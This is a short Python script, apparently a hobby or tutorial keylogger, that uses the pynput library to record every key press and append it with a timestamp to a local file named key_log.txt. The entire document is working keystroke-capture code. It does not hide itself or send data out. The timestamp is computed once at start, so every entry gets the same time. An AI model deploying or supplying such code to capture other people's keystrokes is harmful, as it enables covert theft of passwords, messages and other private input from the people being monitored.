import datetime
from pynput.keyboard import Listener
now = datetime.datetime.now()
# Storing key strokes to a file


def write_to_file(key):
    keydata = str(key)
    with open("key_log.txt", 'a') as f:
        f.write(now.strftime("\n%y-%m-%d | %H:%M:%S\t"))
        f.write(keydata)


with Listener(on_press=write_to_file) as l:
    l.join()
